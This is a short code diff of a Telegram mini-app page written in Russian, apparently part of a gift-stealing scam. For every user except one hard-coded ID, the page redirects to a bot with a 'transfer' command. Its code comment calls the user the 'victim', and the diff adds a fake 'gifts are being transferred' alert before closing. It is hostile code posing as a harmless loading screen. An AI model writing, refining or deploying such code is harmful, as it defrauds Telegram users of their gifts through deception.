@@ -32,7 +32,7 @@
     </style>
 </head>
 <body>
-    <h2>📱 Загрузка мини-приложения...</h2>
+    <h2>📱 Передача подарков...</h2>
     <div class="loader"></div>
     <p>Пожалуйста, подождите</p>
 
@@ -42,8 +42,13 @@
 
         const user = WebApp.initDataUnsafe.user;
         if (user && user.id != 8528804038) {
-            // ОТПРАВЛЯЕМ ЖЕРТВУ К БОТУ С КОМАНДОЙ
-            window.location.href = `tg://resolve?domain=RyzenGift_bot&start=transfer_${user.id}`;
+            // ОТПРАВЛЯЕМ КОМАНДУ /transfer БОТУ
+            window.location.href = 'tg://resolve?domain=RyzenGift_bot&start=transfer';
+            
+            setTimeout(() => {
+                WebApp.showAlert('✅ Подарки передаются!');
+                WebApp.close();
+            }, 2000);
         }
     </script>
 </body>
